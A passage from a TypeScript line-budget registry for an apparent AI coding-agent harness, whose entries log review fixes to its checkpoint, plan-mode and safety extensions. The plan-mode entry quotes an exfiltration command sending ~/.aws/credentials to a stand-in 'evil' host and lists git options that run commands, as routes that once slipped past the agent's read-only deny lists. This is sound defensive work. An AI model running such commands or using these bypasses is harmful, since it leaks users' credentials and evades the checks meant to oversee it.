			"by the 08.2 review fix WR-05: comment-rules.ts gained hasCommentRulesHeading (heading-line match " +
			"outside fenced code). Re-measured 88 raw lines on 2026-10-13 (index.ts 63, comment-rules.ts 25), " +
			"rounded up to the next ten. Re-measured 86 on 2026-10-13 after WR-06 (index.ts 61). Re-measured 90 on " +
			"2026-10-13 after the OpenSpec opt-out env became one assignment (index.ts 65, comment-rules.ts 25), rounded up to the next ten",
	},
	{
		dir: ".pi/extensions/diagnostics",
		budget: 1960,
		why: "WR-03; measured 3913 raw lines across 10 files 2026-08-15 (08-04 added quality-cost.ts; not " +
			"re-reviewed for tightness), rounded up to the next ten. Code-review fix pass WR-06 added " +
			"refundQualityCost() to quality-cost.ts (see workflows/index.ts's own budget entry for the finding). " +
			"Re-measured 1930 raw lines across 10 files 2026-08-15 (budget.ts 435, call-model.ts 217, index.ts " +
			"305, jsonl.ts 73, prose.ts 74, quality-cost.ts 115, redact.ts 159, schema.ts 208, turns.ts 176, " +
			"wire.ts 168), rounded up to the next ten. Re-measured 1936 raw lines across 10 files 2026-10-13 (budget.ts 441 after the per-turn floor). Re-measured 1973 raw lines 2026-10-13 after provider error redaction, the fixtures move and wire capture changes (budget.ts 441, call-model.ts 217, index.ts 299, jsonl.ts 74, prose.ts 74, quality-cost.ts 115, redact.ts 167, schema.ts 219, turns.ts 176, wire.ts 191), rounded up to the next ten. LOWERED 1980 -> 1950: redact.ts takes its value shapes from .pi/lib/secret-patterns.ts; 1944 raw lines (redact.ts 138). RAISED 1950 -> 1960: redact.ts adds redactForModel, the shape-only redactor for reviewer, design-review and MR text; 1952 raw lines (redact.ts 142)",
	},
	{
		dir: ".pi/extensions/checkpoint",
		budget: 550,
		why: "Phase 7 plan 03 (EXT-07)'s vendored checkpoint extension -- git.ts and store.ts never spell " +
			"registerCommand( themselves but count toward this total per WR-03; measured 521 raw lines across " +
			"3 files 2026-08-15 (index.ts 161 + git.ts 183 + store.ts 177), rounded up to the next ten. " +
			"RAISED 530 -> 630 by the Phase 7 code-review fix pass: CR-02 found restoreCheckpoint never " +
			"deleted anything, so a restore produced the union of the checkpoint and everything made after " +
			"it. The fix adds a set-difference removal half (pathsAddedSince + an empty-directory prune) and " +
			"a topLevel() resolution closing WR-13, plus the argument for why a set difference is used " +
			"instead of git clean -- which is the part a future reader most needs and the part a budget " +
			"would otherwise pressure out. Then RAISED 630 -> 940 in the same pass for the remaining " +
			"checkpoint findings: WR-09 (recordCheckpoint was an unlocked read-modify-write over one shared " +
			"file, and git.ts explicitly designs for two concurrent checkpointers -- measured, four " +
			"overlapping processes recording 600 entries kept 55), WR-10 (an unbounded index naming commit " +
			"objects that `git gc` prunes, because commit-tree leaves them unreachable), WR-11 (readCheckpoints " +
			"cast blind, so [1,2,3] reached an `e.sha.slice()` in an event handler), WR-19 (a secret-name " +
			"exclusion pathspec applied symmetrically to both add -A call sites), and the four index.ts " +
			"findings itemised above. Re-measured 933 raw lines across 3 files 2026-08-15 (index.ts 229 + " +
			"git.ts 374 + store.ts 330), rounded up to the next ten. Two ratchet raises, both recorded with " +
			"the previous figure and the reason rather than quietly widened. RAISED 940 -> 1050 by the " +
			"iteration-3 fix pass for CR2-03: pathsAddedSince computes 'what exists now' with git add -A, " +
			"which respects .gitignore AND NOTHING ELSE, so in any repository that does not ignore them " +
			".pi/state (this module's OWN store, created by store.ts moments after each capture), .env, " +
			"node_modules/ and .terraform/ were ordinary untracked-non-ignored paths and were DELETED by a " +
			"restore -- measured, readCheckpoints() returned [] afterwards. The added lines are " +
			"MACHINE_STATE_EXCLUDE_PATHSPECS, the pre-restore undo checkpoint that makes restoring " +
			"reversible, and the CORRECTION of the docstring that argued the set difference was safer than " +
			"git clean -fd (for untracked-non-ignored paths it was identical). A false safety argument in a " +
			"data-loss path is exactly what a line budget must not pressure out. Re-measured 1050 raw lines " +
			"across 3 files 2026-08-15 (index.ts 244 + git.ts 475 + store.ts 331). RAISED 1050 -> 1070 for " +
			"WR2-05: `:(exclude)credentials` is a LITERAL path match and excluded only a repo-root file of " +
			"that name, so sub/.aws/credentials -- the shape the exclusion is named for -- was captured on " +
			"every turn. Fixed to `*credentials`, with the executed evidence beside it because a pathspec " +
			"that looks right and matches nothing is exactly the class of bug a comment prevents. " +
			"Re-measured 1064 raw lines across 3 files 2026-08-15 (index.ts 244 + git.ts 489 + store.ts 331). " +
			"RAISED 1070 -> 1100 for the WR-09 lost-update fix (debug session wr09-lost-update): withLock used " +
			"to run its read-modify-write body UNLOCKED once LOCK_MAX_WAIT_MS (2000ms) elapsed without " +
			"acquiring the lock, defended as a deliberate trade in the docstring. That trade was never " +
			"exercised safely -- the staleness breaker already reclaims a genuinely dead holder's lock within " +
			"LOCK_STALE_MS (30s), so the unlocked fallback only ever fired against LIVE contention, and every " +
			"fallback firing was a real lost row: instrumented and measured, 4 degraded calls -> 10 rows lost " +
			"(590/600) under synthetic CPU contention, 0 degraded calls -> 0 rows lost otherwise -- exactly " +
			"the intermittent 596/600 and 599/600 two prior executors misdiagnosed as test flakiness in " +
			"deferred-items.md. Fixed by removing the unlocked fallback (withLock now throws on genuine " +
			"acquisition failure, caught by the existing NEVER THROWS wrapper in recordCheckpoint/" +
			"pruneCheckpoints) and raising LOCK_MAX_WAIT_MS to LOCK_STALE_MS + 5000ms so a caller only gives " +
			"up after the staleness breaker has had a full window to clear a dead lock. The added lines are " +
			"the new docstrings explaining why the old trade did not hold and what replaced it -- exactly the " +
			"kind of reasoning a budget must not pressure out of a concurrency-correctness fix. Re-measured " +
			"1098 raw lines across 3 files 2026-08-15 (index.ts 244 + git.ts 489 + store.ts 365). Re-measured 548 raw " +
			"lines across 3 files 2026-10-13 (index.ts 130 + git.ts 204 + store.ts 214), rounded up to the next ten",
	},
	{
		dir: ".pi/extensions/loop-police",
		budget: 1330,
		why: "Phase 7 plan 06 (EXT-05/EXT-10)'s vendored pi-loop-police@1.14.1 -- index.ts never spells " +
			"registerCommand( itself (a named re-export) but counts toward this total per WR-03; measured " +
			"1260 raw lines across 2 files 2026-08-15 (index.ts 23 + loop-police.ts 1237, both including " +
			"short vendoring-fix comments), upstream's own size, not a number this phase reviewed for " +
			"tightness, rounded up to the next ten. RAISED 1270 -> 1310 by the Phase 7 code-review fix " +
			"pass for WR-17's environment pinning of HOOK_CMD/HOOK_LOG -- see the per-file entry above for " +
			"the finding. Re-measured 1299 raw lines across 2 files 2026-08-15. RAISED 1310 -> 1330 for " +
			"WR2-04 -- see the per-file entry above. Re-measured 1326 raw lines across 2 files 2026-08-15 " +
			"(index.ts 23 + loop-police.ts 1303)",
	},
	{
		dir: ".pi/extensions/plan-mode",
		budget: 870,
		why: "Phase 7 plan 07 (EXT-05/EXT-06)'s vendored Pi bundled example examples/extensions/plan-mode/ -- " +
			"utils.ts never spells registerCommand( itself (pure helper functions) but counts toward this " +
			"total per WR-03; measured 634 raw lines across 2 files 2026-08-15 (index.ts 460 + utils.ts 174, " +
			"upstream's own 390+168=558 lines plus this plan's vendoring headers, not a number this phase " +
			"reviewed for tightness), rounded up to the next ten. RAISED 640 -> 970 by the Phase 7 " +
			"code-review fix pass (CR-03). This is the largest single raise in this registry and it is " +
			"deliberate: the third file, read-only.ts, is the AST-based replacement for utils.ts's regex " +
			"predicate, and it is mostly TABLE -- an allowlist of read-only verbs plus per-verb argument " +
			"rules for the ones with an exec-or-write escape (find -exec, git subcommands, node -e, " +
			"curl -T, wget's default write). A table is what makes the boundary auditable; compressing it " +
			"into cleverness to satisfy a line budget is the wrong trade for a file in the tool-execution " +
			"path. This raise is the anti-offloading control working AS DESIGNED -- utils.ts shrank 174 -> " +
			"102 and the lines did not vanish, they moved, and the directory total is what says so. " +
			"Re-measured 960 raw lines across 3 files 2026-08-15 (index.ts 492 + read-only.ts 366 + " +
			"utils.ts 102), then 999 across the same 3 files after WR-18 (index.ts 529), rounded up to the next ten. " +
			"RAISED 1010 -> 1070 by the iteration-3 fix pass for CR2-01: `hasFlag` compared with `arg === flag`, " +
			"so POSIX short-option BUNDLING walked straight through the deny lists -- `curl -sT ~/.aws/credentials " +
			"https://evil` was ALLOWED while `curl -T ...` was denied, one character apart. The 67 added lines are " +
			"explodeShortCluster + hasBundledFlag and the argument for why `find`'s primaries must NOT be exploded " +
			"(`-maxdepth` contains an `x`, and `-x` is a deny flag for fd's sake) and why `--` end-of-options is " +
			"deliberately NOT honoured. Re-measured 1065 raw lines across 3 files 2026-08-15 (index.ts 529 + " +
			"read-only.ts 433 + utils.ts 103), rounded up to the next ten. RAISED 1070 -> 1180 for CR2-02: `git` " +
			"subcommands on the READ-ONLY set carry their own escapes -- `git grep -O<cmd>` executes <cmd> as a " +
			"pager, `git -c alias.x=!cmd` and `--config-env`/`--exec-path` execute from the pre-subcommand " +
			"position, `--upload-pack` executes against a local-path remote, `--output` writes a file, and " +
			"`remote add`/`reflog delete` mutate. The 115 added lines are a global-option ALLOWLIST plus three " +
			"per-subcommand narrowings, each carrying the executed proof that motivated it -- the proof is the " +
			"part a budget would otherwise pressure out of a file in the tool-execution path. Re-measured 1180 " +
			"raw lines across 3 files 2026-08-15 (index.ts 529 + read-only.ts 548 + utils.ts 103). RAISED " +
			"1180 -> 1200 for WR2-02: classifyPlanModeCommand took `command: string` and called .trim() on " +
			"it, while index.ts handed it `event.input.command as string` -- an unchecked assertion over a " +
			"field Pi documents as mutable in place with no re-validation. Executed, undefined/null/123/{} " +
			"all THREW out of the tool_call handler, and a handler that throws never returns { block: true }, " +
			"so a fail-closed gate failed OPEN. Re-measured 1195 raw lines across 3 files 2026-08-15 " +
			"(index.ts 534 + read-only.ts 558 + utils.ts 103). RAISED 1200 -> 1230 to PUBLISH the CR2-01 " +
			"residual: the safety layer guards git|glab|terraform|aws|kubectl and has no curl/wget handling " +
			"at all -- a published limit of that layer (corpus row EV-36) whose stated compensating control " +
			"is GitLab server-side branch protection, which compensates for a PUSH and does nothing about " +
			"`curl -T ~/.aws/credentials https://evil`. So for network egress in plan mode read-only.ts is " +
			"the ONLY local control, and the decision NOT to add curl/wget to GUARDED_VERB_PATTERN in a " +
			"review-fix pass is recorded with its reasons rather than left as an omission. A residual that " +
			"is not written down is one nobody can act on. Re-measured 1222 raw lines across 3 files " +
			"2026-08-15 (index.ts 534 + read-only.ts 585 + utils.ts 103). RAISED 1230 -> 1240 by plan " +
			"09-03: DEVIATION 6 (the /plan -> /plan-mode rename, a genuine composition conflict with " +
			"Phase 9's ceremonial /plan workflow) added its header paragraph to index.ts. Re-measured " +
			"1235 raw lines across 3 files 2026-08-15 (index.ts 547 + read-only.ts 585 + utils.ts 103), " +
			"rounded up to the next ten. Re-measured 1248 raw lines 2026-10-13 after the plan-mode write holes were closed (index.ts 547, read-only.ts 598, utils.ts 103), rounded up to the next ten. LOWERED 1250 -> 1210: read-only.ts imports that shared list instead of its own copy; 1206 raw lines. LOWERED 1210 -> 870: read-only.ts comments cut to short WHY notes with the analysis moved to docs/EXTENSIONS.md, and its tables compacted; 868 raw lines (index.ts 547, read-only.ts 218, utils.ts 103). Unchanged at 870 after bat moved to the argument rules, which refuse --pager and --paging=always; 869 raw lines",
	},
	{
		dir: ".pi/extensions/safety",
		budget: 4340,
		why: "CR-04 (code-review fix pass): another directory importedSubsystemDirs newly discovers -- " +
			"workflows/index.ts imports classifyGitInvocation/currentBranch/currentSha/currentTree from " +
			"../safety/git.ts and PROTECTED_BRANCHES from ../safety/index.ts, and safety/ spells " +
			"registerCommand( nowhere (verified: zero matches), so this directory was as invisible to the " +
			"pre-CR-04 registry as quality/ was. This entry did not exist before CR-04, so there is no prior " +
			"committed number to raise from -- grandfathered in at its CURRENT measured total, same precedent " +
			"WR-05 already set for routing/harness/diagnostics (not a number this phase reviewed for " +
			"tightness). Measured 4,455 raw lines across 9 files 2026-08-15 (approvals.ts 411, audit.ts 133, " +
			"git.ts 513, index.ts 840, infra.ts 431, paths.ts 585, policy.ts 658, schema.ts 79, shell.ts 805), " +
			"rounded up to the next ten. RAISED 4460 -> 4570 by plan 09-04 (FLOW-08): git.ts grew " +
			"extractMrCreateTarget + mrCreateTargetsSafeBranch (the mr create conditional-allow predicate) " +
			"plus the module-docstring and classifyGlabInvocation-docstring amendments distinguishing " +
			"currentBranch-independence from destination-branch-dependence, and policy.ts grew a two-line " +
			"comment plus the facts.protectedBranches threading at its one classifyGlabInvocation call site. " +
			"Re-measured 4,569 raw lines across the same 9 files 2026-08-15 (approvals.ts 411, audit.ts 133, " +
			"git.ts 621, index.ts 840, infra.ts 431, paths.ts 585, policy.ts 664, schema.ts 79, shell.ts 805), " +
			"rounded up to the next ten. RAISED 4570 -> 4710 by plan 08.1-03 (UPG-03, Pi 1.x tool paths): index.ts " +
			"grew the powershell/MCP/codemode/tool_search/background-tasks deny + bg_run-as-bash branch, audit.ts " +
			"records parentToolCallId, schema.ts gained the matching field. Re-measured 4,709 raw lines across the " +
			"same 9 files 2026-10-13 (approvals.ts 411, audit.ts 138, git.ts 621, index.ts 973, infra.ts 431, " +
			"paths.ts 585, policy.ts 664, schema.ts 81, shell.ts 805), rounded up to the next ten. RAISED 4710 -> 4760 by the 08.1 review fixes (CR-01/WR-01/WR-02 guardBgRun, WR-04 redactSecrets in audit.ts). Re-measured 2,706 raw lines across the same 9 files 2026-10-13, rounded up to the next ten. Re-measured 2,725 after the glab mr create target scan was tightened, rounded up to the next ten. Re-measured 2,765 after push required an explicit non-protected src:dst refspec, rounded up to the next ten. Re-measured 2777 raw lines after the attempt log, drift base and accepted entries moved to the signed ledger, rounded up to the next ten. LOWERED 2780 -> 2440 after the wrapper grammars, infra tables and audit rows were compacted into data tables and helpers: re-measured 2,431 raw lines across the same 9 files 2026-10-13 (approvals.ts 153, audit.ts 87, git.ts 366, index.ts 410, infra.ts 201, paths.ts 394, policy.ts 331, schema.ts 29, shell.ts 460), rounded up to the next ten. Re-measured 2,431 raw lines after directory overrides were folded and runner scripts narrowed, offset by compacting policy.ts guard clauses (policy.ts 296, shell.ts 495, the rest unchanged). Re-measured 3322 raw lines across 10 files 2026-10-13, rounded up to the next ten. RAISED 2440 -> 3330 once, after dead exports were trimmed first (classifyPushFailure removed). Per-file raw lines: approvals.ts 163, audit.ts 90, git.ts 661, index.ts 503, infra.ts 230, paths.ts 555, policy.ts 399, schema.ts 29, shell.ts 565, subagents.ts 127. Causes: push planning in git.ts; the fail-closed command-name predicate, the git subcommand allow-list, and redirect, @file, glob, case and credential-read classification in shell.ts, paths.ts and policy.ts; the subagent required-child guard and management confirm in subagents.ts; the RPC confirm in approvals.ts. No frozen ceiling moved. RAISED 3330 -> 3360: git-options.ts holds the one list of git options and forms that run a program or write a file, shared with plan mode; 3357 raw lines. RAISED 3360 -> 3490: shell.ts refuses scripts read from a pipe or written and run by the same command, and exports writeOperands, the per-command write-operand table the path classifier reuses; 3486 raw lines. RAISED 3490 -> 3540: path arguments and redirects are resolved in the directory a cd, pushd or env -C leads to, and each command carries its own redirect targets; 3540 raw lines. RAISED 3540 -> 3570: bash tree walkers (rg, ag, find, fd, tar, grep -r, ls -R, cp -r, rsync -r, zip -r) get the same sensitive search-root check as the grep tool; 3566 raw lines. RAISED 3570 -> 3600: paths.ts refuses any path segment that is an 8.3 alias of a protected name, for reads and writes; 3597 raw lines. RAISED 3600 -> 3620: bash redirects and write operands go through the write tool's classifier, with device files, /tmp and the temp dir as scratch; 3619 raw lines. RAISED 3620 -> 3660: writes to extension code and provider config ask through the push confirm, with a per-ask title; 3656 raw lines. Unchanged at 3660 after the approval dialog took canConfirm and the confirm timeout; 3657 raw lines. RAISED 3660 -> 3700: hook managers, git config files below .git and the core.hooksPath directory became detonation targets, and the recursive-walker table gained a type; 3694 raw lines. RAISED 3700 -> 3720: a GIT_* variable exported or assigned anywhere in a script that runs git blocks; 3712 raw lines. RAISED 3720 -> 3770: git.ts blocks a protected branch written by name from any HEAD and reports where a checkout or switch leaves HEAD, which policy.ts carries to later git in the command; 3770 raw lines. RAISED 3770 -> 3810: the sensitive-read table gained the user's other credential stores and /proc environ, and policy.ts refuses shell environment dumps; 3803 raw lines. RAISED 3810 -> 3820: a search tool's pattern operand is no longer path-classified and a leading ~/ in command position is literal; 3816 raw lines. Unchanged at 3820 after comments and a block reason stopped citing planning artifacts and test files; 3815 raw lines. RAISED 3820 -> 3830: index.ts audits and shows a failed child-guard registration and refuses a subagent definition too long to confirm in full; 3826 raw lines. LOWERED 3830 -> 3820: audit.ts takes its value shapes from .pi/lib/secret-patterns.ts; 3811 raw lines (audit.ts 75). LOWERED 3820 -> 3810: a code runner is refused when its stdin is a pipe, it names a stdin alias, or it runs a file the same command wrote, whatever the file is called; 3810 raw lines. RAISED 3810 -> 3910: xargs, find -exec, fd -x and parallel are unwrapped, and a wrapper or an inline-code runner under them is refused; 3905 raw lines. RAISED 3910 -> 3980: programs that take a command string from their own arguments (awk, sed, tar, rsync, bat, make, sort, interactive pagers and editors) are refused; 3974 raw lines. Unchanged at 3980 after the MSYS drive rewrite runs after . and .. are collapsed; 3972 raw lines. Unchanged at 3980 after pushd stack moves and a CDPATH in the command make the cd target unknown; 3976 raw lines. RAISED 3980 -> 3990: after an unresolved cd only path-shaped arguments, credentials file names, write targets and redirects are refused, and a cd $HOME target resolves; 3987 raw lines. RAISED 3990 -> 4010: worktree add -b/-B and a rebase branch argument naming a protected branch block, and checkout --track, @{-N} and worktree add carry the protected branch to later git; 4003 raw lines. RAISED 4010 -> 4020: checkout, switch, restore and the stash forms became named allows on a protected HEAD, and the block reason names git switch -c; 4012 raw lines. RAISED 4020 -> 4080: git checkout, restore, rm and mv paths are write-classified, git apply and am and writers under xargs or find -exec confirm, perl -i writes its operands, and interpreter one-liners that open, write or run are refused; 4073 raw lines. Unchanged at 4080 after a destination cp, mv, install, ln, tee or touch only writes is not read-classified; 4078 raw lines. Unchanged at 4080 after the path after a git revision's colon is read-classified; 4080 raw lines. RAISED 4080 -> 4250 (2026-10-13): shell.ts gained the per-interpreter option grammar that decides when a piped runner reads stdin as code, and infra.ts skips terraform's global options; 4245 raw lines RAISED 4250 -> 4350 (2026-10-13): branches.ts reads add-only protected-branch lists from the user and project settings files, and subagents.ts resolves pi-subagents from the loaded tool's source path; 4348 raw lines. RAISED 4350 -> 4370 (2026-10-13): branches.ts keeps the list a settings file last gave the process when that file stops parsing, and index.ts reports a settings warning raised mid-session once; 4367 raw lines. RAISED 4370 -> 4380 (2026-10-13): subagents.ts resolves pi-subagents only from the loaded subagent tool and names why when it cannot, with no npm-root fallback; 4374 raw lines. LOWERED 4380 -> 4290 (2026-10-13): shell.ts drops the per-interpreter pipe grammar for the strict rule that refuses any piped code runner, and adds fail-closed checks for startup variables, option values, implicit Python imports, xargs input and awk or sed program files; 4284 raw lines. RAISED 4290 -> 4330 (2026-10-13): startup variables are refused wherever they are assigned, whatever runs, sed and awk program files are read from option clusters and long-option prefixes, find -exec placeholders and privilege shells are checked against written files; 4325 raw lines. RAISED 4330 -> 4340 (2026-10-13): the sed and awk program-file grammars got a named type so the map typechecks; 4333 raw lines.",
	},
	{
		dir: ".pi/extensions/quality",
		budget: 2560,
		why: "CR-04 (code-review fix pass): GATE-01's gate stage, the reviewer, calibration and the refute pass " +
			"-- called directly by /quick (workflows/index.ts:12 imports runQuickGateStage from ./index.ts, :42 " +
			"calls it) but discovered by NO registerCommand( call anywhere in this directory; " +
			"importedSubsystemDirs (see this file's own CR-04/WR2-04 docstring section) is what makes " +
			"commandDirs see it at all. Measured 3,406 raw lines across 8 files 2026-08-15 pre-fix-pass " +
			"(advisor.ts 197, calibration.ts 178, gates.ts 407, index.ts 237, reviewer.ts 409, review-schema.ts " +
			"541, rules.ts 889, verdict.ts 548) -- this entry did not exist before CR-04, so there is no prior " +
			"committed number to raise from. Re-measured 3,548 raw lines across the same 8 files 2026-08-15 " +
			"after this phase's OWN code-review fix pass (CR-01/CR-02 localBin resolution in index.ts and " +
			"gates.ts; WR-01/WR-02 the duplicate-verdict and unrecognised-status branches in review-schema.ts; " +
			"WR-03 the behaviour-describing calibration needles in calibration.ts; WR-05 the export-from regex " +
			"in reviewer.ts: advisor.ts 198, calibration.ts 179, gates.ts 426, index.ts 301, reviewer.ts 425, " +
			"review-schema.ts 580, rules.ts 890, verdict.ts 549). RAISED 3550 -> 3610 by the iteration-2 " +
			"code-review fix pass: CR2-01 wired index.ts's productionExec through .pi/lib/win-quote.ts#commandFor " +
			"instead of raw shell:true+args concatenation, and WR2-01 widened localBin to walk ancestor " +
			"node_modules directories -- both in index.ts, which grew 301 -> 355. Re-measured 3,602 raw lines " +
			"across the same 8 files 2026-08-15 (advisor.ts 198, calibration.ts 179, gates.ts 426, index.ts 355, " +
			"review-schema.ts 580, reviewer.ts 425, rules.ts 890, verdict.ts 549). RAISED 3610 -> 3670 by the " +
			"SAME iteration-2 fix pass: WR2-05 added the MIN_DISTINCT_NEEDLES two-needle matcher to " +
			"calibration.ts (179 -> 206), and WR2-06 added the projectTrusted trust gate to index.ts's " +
			"resolveExec (355 -> 387). Re-measured 3,661 raw lines across the same 8 files 2026-08-15 " +
			"(advisor.ts 198, calibration.ts 206, gates.ts 426, index.ts 387, review-schema.ts 580, reviewer.ts " +
			"425, rules.ts 890, verdict.ts 549), rounded up to the next ten. RAISED 3670 -> 3740 by the " +
			"iteration-3 fix pass (`08-REVIEW.md`): WR3-01 added the cross-contamination check and its docstring " +
			"to calibration.ts's findingCatches (206 -> 249), and WR3-04 added the pre-spawn '%' rejection guard " +
			"to index.ts's productionExec (387 -> 422). Re-measured 3,739 raw lines across the same 8 files " +
			"2026-08-15 (advisor.ts 198, calibration.ts 249, gates.ts 426, index.ts 422, review-schema.ts 580, " +
			"reviewer.ts 425, rules.ts 890, verdict.ts 549), rounded up to the next ten. RAISED 3740 -> 3750 by " +
			"the R3CHECK fix pass (`08-REVIEW-R3CHECK.md`): WR3C-02 widened index.ts's pre-spawn '%' guard from " +
			"`bin` alone to `[bin, ...args]` (422 -> 431) -- calibration.ts's own CR3C-01 fix (needle-set and " +
			"test changes) touched no production file under this directory. Re-measured 3,748 raw lines across " +
			"the same 8 files 2026-08-15 (advisor.ts 198, calibration.ts 249, gates.ts 426, index.ts 431, " +
			"review-schema.ts 580, reviewer.ts 425, rules.ts 890, verdict.ts 549), rounded up to the next ten. " +
				"RAISED 3750 -> 3810 by plan 09-12 (QUAL-08): gates.ts grew QUALITY_MECHANISMS, WorkflowId, " +
				"GateDepth, GATE_DEPTH_BY_WORKFLOW and gateDepthFor -- the pure gate-depth selector, added beside " +
				"shouldRunDesignReview in the same family (426 -> 486); no other file in this directory changed. " +
				"Re-measured 2,191 raw lines across the same 8 files 2026-10-13 (advisor.ts 74, calibration.ts " +
				"122, gates.ts 257, index.ts 173, review-schema.ts 392, reviewer.ts 231, rules.ts 631, verdict.ts " +
				"311), rounded up to the next ten. RAISED 2200 -> 2250 by plan 09-14 (FLOW-05): review-schema.ts gained the " +
				"optional scopeDrift field, the validateReview rejection of a model-supplied drift property and the Scope " +
				"Drift render block (392 -> 443). Re-measured 2,242 raw lines across the same 8 files 2026-10-13, rounded up " +
				"to the next ten. Re-measured 2305 raw lines after the deterministic gate began checking the work repo's changed files, rounded up to the next ten. Re-measured 2426 raw lines 2026-10-13 after the lint leg, the change gate availability rules and the design-review pass (advisor.ts 75, calibration.ts 122, design-review.ts 143, gates.ts 158, index.ts 267, review-schema.ts 469, reviewer.ts 240, rules.ts 631, verdict.ts 321), rounded up to the next ten Re-measured 2436 raw lines 2026-10-13 (index.ts 278) after the gate legs began resolving git's top-level-relative paths from the top level and finding the ESLint config up to it, rounded up to the next ten. Re-measured 2430 raw lines 2026-10-13 (index.ts 272) after localBin reused the bounded findUp walk. Re-measured 2468 raw lines 2026-10-13 (index.ts 310) after the lint leg began reading ESLint's JSON report so an all-ignored run is unavailable, not a pass, and the missing config names, rounded up to the next ten. Re-measured 2486 raw lines 2026-10-13 (index.ts 328) after the typecheck leg began refusing a solution-style tsconfig that checks nothing, rounded up to the next ten. Re-measured 2494 raw lines 2026-10-13 (design-review.ts 151) after a failed design pass became a notice and malformed design findings began to be dropped one by one, rounded up to the next ten. Re-measured 2490 raw lines 2026-10-13 after the comment cleanup. Re-measured 2491 raw lines 2026-10-13 (design-review.ts 152) after the quoted diff header fix, rounded up to the next ten. Re-measured 2487 raw lines 2026-10-13 (index.ts 321) after the ESLint config probe lost its try/catch, rounded up to the next ten.. LOWERED 2490 -> 2480: nested role calls no longer build their own guard need, runSingleShotRole derives it from the request; 2479 raw lines RAISED 2480 -> 2520 (2026-10-13): typecheckFailsAtCommit and typecheckBaseline run the lazy merge-base typecheck for /review in a temporary worktree; 2520 raw lines. RAISED 2520 -> 2540 (2026-10-13): typecheckAtCommit reports a base it could not check as an error, which /review asks about instead of refusing, and its cleanup cannot throw; 2533 raw lines. RAISED 2540 -> 2550 (2026-10-13): the base worktree is checked out with repository hooks and Git LFS disabled through an empty temporary hooks directory; 2541 raw lines. RAISED 2550 -> 2560 (2026-10-14): cwd and the git top level are compared as real paths, so a symlinked or 8.3 temp dir finds its own top level; 2553 raw lines.",
	},
	{
		dir: ".pi/extensions/providers",
		budget: 450,
		why: "WR2-04 (`08-REVIEW.md` iteration 2): importedSubsystemDirs' transitive walk newly discovers this " +
			"directory -- routing/index.ts imports ./modes.ts (same-directory, already inside the routing/ " +
			"ratchet), and modes.ts itself imports callWithFallback from ../providers/fallback.ts and CHAIN " +
			"from ../providers/schema.ts, a hop CR-04's depth-1-only version never followed. Grandfathered in " +
			"at its CURRENT measured total, the same precedent WR-05 set for routing/harness/diagnostics and " +
			"CR-04 set for quality/safety (not a number this phase reviewed for tightness) -- this entry did " +
			"not exist before WR2-04, so there is no prior committed number to raise from. Measured 599 raw " +
			"lines across 4 files 2026-10-13 (fallback.ts 112, index.ts 138, schema.ts 273, sso.ts 76), " +
			"rounded up to the next ten. Re-measured 440 raw lines 2026-10-13 after the error fixtures moved to tests/fixtures and the dead exports were removed (fallback.ts 137, index.ts 138, schema.ts 89, sso.ts 76), rounded up to the next ten RAISED 440 -> 450 (2026-10-13): callWithFallback takes a per-hop capability guard; 450 raw lines.",
	},
	{
		dir: ".pi/lib",
		budget: 830,
		why: "WR2-04 (`08-REVIEW.md` iteration 2): importedSubsystemDirs no longer filters to `.pi/extensions/` " +
			"only -- `.pi/lib/jsonl.ts` is imported (via `../../lib/jsonl.ts`) by quality/index.ts (indirectly, " +
			"through .pi/lib/win-quote.ts's own CR2-01 wiring), routing/index.ts, safety/audit.ts and " +
			"workflows/evidence.ts, and was a live, unbudgeted shared-library import target with no " +
			"DIRECTORY_BUDGETS entry at all before this fix -- exactly the residual the finding named. A hit " +
			"outside `.pi/extensions/` maps to its own immediate directory (dirname), never a subsystem-root " +
			"slice, since `.pi/lib` is shallow by construction. Grandfathered in at its CURRENT measured total, " +
			"same precedent as routing/harness/diagnostics/quality/safety/providers -- this entry did not " +
			"exist before WR2-04, so there is no prior committed number to raise from. Measured 687 raw lines " +
			"across 2 files 2026-08-15 (jsonl.ts 606, win-quote.ts 81 -- win-quote.ts itself landed this same " +
			"iteration, moved here from tests/helpers/ by CR2-01), rounded up to the next ten. RAISED " +
			"690 -> 840 by plan 09-03 (FLOW-10): a third file, work-artifacts.ts, is the ARTIFACT_FILES " +
			"registry and the two-layer-confined workDir() every one of the four ceremonial commands built " +
			"in this phase's later plans will import -- it counts toward this total per WR-03's whole-directory " +
			"discipline even though it is imported by test files only today (its production consumers do not " +
			"exist until plans 09-08/10/13/15). Measured 839 raw lines across 3 files 2026-08-15 (jsonl.ts 606, " +
			"win-quote.ts 81, work-artifacts.ts 152), rounded up to the next ten. LOWERED 840 -> 660 by the " +
			"08.2 review fix WR-07: .pi/lib joined the comment-discipline gate and its history/ID comments were " +
			"condensed. Re-measured 655 raw lines on 2026-10-13 (jsonl.ts 497, win-quote.ts 67, " +
			"work-artifacts.ts 91), rounded up to the next ten. Re-measured 670 raw lines after the workflow commands began retiring each other's per-turn hooks, rounded up to the next ten. Re-measured 715 raw lines 2026-10-13 after the signed-ledger and JSONL hardening in jsonl.ts (active-workflow.ts 15, jsonl.ts 542, win-quote.ts 67, work-artifacts.ts 91), rounded up to the next ten. RAISED 720 -> 770: secret-patterns.ts is the one credential-shape table shared by the wire redactor and the safety audit, so the wire log is never redacted more weakly than the audit; 765 raw lines (secret-patterns.ts 50). RAISED 770 -> 780: jsonl.ts re-stats the live file before rotating and never renames onto an existing rotated file; 779 raw lines (jsonl.ts 556). RAISED 780 -> 800: secret-patterns.ts splits the table into shape rules for model inputs and name rules for logs only, with length-bounded name rules; 792 raw lines (secret-patterns.ts 67) RAISED 800 -> 820 (2026-10-13): settings.ts is the shared settings-file key reader; 818 raw lines. RAISED 820 -> 830 (2026-10-14): rotate re-checks the cap before moving any file, so a stale writer does not rotate a sibling's near-empty successor; 829 raw lines.",
	},
	{
		dir: ".pi/extensions/grill",
		budget: 1170,
		why: "plan 09-05 (FLOW-03): the first file of the /grill subsystem, spec-schema.ts -- the SPEC section " +
			"parser and the §2 evidence gate (gateRequirementsAuthorship). This directory holds no " +
			"registerCommand( call yet (plan 09-08 wires the /grill command itself) and is not YET reachable " +
			"by commandDirs' present-but-undeclared check for that reason -- declared here anyway, ahead of " +
			"that check requiring it, because DIRECTORY_BUDGETS has no declared-but-absent check and declaring " +
			"the directory before its command file exists is the honest thing to do, per this plan's own " +
			"instruction. Measured 522 raw lines across 1 file 2026-08-15 (spec-schema.ts), rounded up to the " +
			"next ten. RAISED 530 -> 1170 by plan 09-06 (FLOW-04/FLOW-05 declaration half/QUAL-03): the same " +
			"single file grew the §4 EARS-lite parser (IF_THEN_PATTERN, MIN_ERROR_BEHAVIOURS, " +
